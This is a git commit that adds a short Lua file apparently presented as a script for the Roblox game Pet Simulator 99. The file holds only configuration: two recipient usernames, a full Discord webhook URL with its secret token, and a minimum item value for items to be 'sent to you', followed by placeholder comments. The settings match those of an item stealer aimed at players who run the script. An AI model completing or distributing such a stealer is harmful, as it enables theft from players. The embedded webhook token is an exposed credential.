f6ad4a735e84af639a1ca13ff8d0b9e5bfae4ebf
VOIDZ <goldbed145@gmail.com>
2024-12-13 12:16:29 +0800

    Upload new file: Ps99_Script_131628_note.lua

---
+++ Ps99_Script_131628_note.lua
@@ -0,0 +1,8 @@
+
+Username = "mainarxd123"
+Username2 = "goldbedi46" -- Second username
+webhook = "https://discord.com/api/webhooks/1315408872793702520/pqWZQxlJS9muEbCfMkAWcOOEInL8EZkAHOgGlMxMEkgj8QkMQlqieEi22FLNgVYnCflq"
+min_rap = 30 -- Minimum RAP of each item you want to get sent to you
+
+-- Add the logic or functionality for your script here
+-- You can adjust this to your actual game logic
